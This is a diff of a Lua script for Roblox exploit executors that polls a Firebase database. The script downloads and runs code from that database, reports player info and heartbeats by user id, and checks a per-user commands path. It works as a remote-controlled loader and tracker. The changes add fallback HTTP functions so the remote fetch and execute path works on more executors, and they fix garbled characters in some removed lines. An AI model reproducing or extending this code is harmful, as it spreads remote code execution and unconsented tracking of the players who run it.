@@ -25,10 +25,17 @@ local function checkAndExecuteScript()
     
     -- Use executor's HTTP functions (compatible with Delta)
     local success, response = pcall(function()
-        return (syn and syn.request or http_request or request)({
-            Url = url,
-            Method = "GET"
-        }).Body
+        -- FIX: Check for different HTTP request functions to prevent nil value error
+        local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+        if requestFunc then
+            return requestFunc({
+                Url = url,
+                Method = "GET"
+            }).Body
+        else
+            -- Fallback to game:HttpGet if no request function found
+            return game:HttpGet(url, true)
+        end
     end)
     
     if not success then
@@ -51,14 +58,20 @@ local function checkAndExecuteScript()
             else
                 -- Clear the script from DB after successful execution
                 pcall(function()
-                    (syn and syn.request or http_request or request)({
-                        Url = url,
-                        Method = "PUT",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = '{"code":""}'
-                    })
+                    local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+                    if requestFunc then
+                        requestFunc({
+                            Url = url,
+                            Method = "PUT",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = '{"code":""}'
+                        })
+                    else
+                        -- Fallback if no request function available
+                        game:HttpGet(url .. '?code=', true)
+                    end
                 end)
             end
         end
@@ -87,34 +100,40 @@ local function sendPlayerInfo()
     local playerInfo = getPlayerInfo()
     if playerInfo then
         pcall(function()
-            (syn and syn.request or http_request or request)({
-                Url = "https://omebgle-default-rtdb.firebaseio.com/players/" .. playerInfo.userid .. ".json",
-                Method = "PUT",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = game:GetService("HttpService"):JSON极ncode(playerInfo)
-            })
+            local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+            if requestFunc then
+                requestFunc({
+                    Url = "https://omebgle-default-rtdb.firebaseio.com/players/" .. playerInfo.userid .. ".json",
+                    Method = "PUT",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = game:GetService("HttpService"):JSONEncode(playerInfo)
+                })
+            end
         end)
     end
 end
 
 -- Send heartbeat to database
 local function sendHeartbeat()
-    local playerInfo =极tPlayerInfo()
+    local playerInfo = getPlayerInfo()
     if playerInfo then
         pcall(function()
-            (syn and syn.request or http_request or request)({
-                Url = "https://omebgle-default-rtdb.firebaseio.com/heartbeats/" .. playerInfo.userid .. ".json",
-                Method = "PUT",
-                Headers = {
-                    ["Content-Type"] = "application/json"
-                },
-                Body = game:GetService("HttpService"):JSONEncode({
-                    timestamp = os.time(),
-                    userid = playerInfo.userid
+            local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+            if requestFunc then
+                requestFunc({
+                    Url = "https://omebgle-default-rtdb.firebaseio.com/heartbeats/" .. playerInfo.userid .. ".json",
+                    Method = "PUT",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = game:GetService("HttpService"):JSONEncode({
+                        timestamp = os.time(),
+                        userid = playerInfo.userid
+                    })
                 })
-            })
+            end
         end)
     end
 end
@@ -124,10 +143,15 @@ local function checkCommands(userId)
     local commandUrl = "https://omebgle-default-rtdb.firebaseio.com/commands/" .. userId .. ".json"
     
     local success, response = pcall(function()
-        return (syn and syn.request or http_request or request)({
-            Url = commandUrl,
-            Method = "GET"
-        }).Body
+        local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+        if requestFunc then
+            return requestFunc({
+                Url = commandUrl,
+                Method = "GET"
+            }).Body
+        else
+            return game:HttpGet(commandUrl, true)
+        end
     end)
     
     if success then
@@ -155,14 +179,17 @@ local function checkCommands(userId)
             -- Clear the command after 5 seconds
             delay(5, function()
                 pcall(function()
-                    (syn and syn.request or http_request or request)({
-                        Url = commandUrl,
-                        Method = "PUT",
-                        Headers = {
-                            ["Content-Type"] = "application/json"
-                        },
-                        Body = '{"command":""}'
-                    })
+                    local requestFunc = syn and syn.request or http and http.request or http_request or request or fluxus and fluxus.request
+                    if requestFunc then
+                        requestFunc({
+                            Url = commandUrl,
+                            Method = "PUT",
+                            Headers = {
+                                ["Content-Type"] = "application/json"
+                            },
+                            Body = '{"command":""}'
+                        })
+                    end
                 end)
             end)
         end
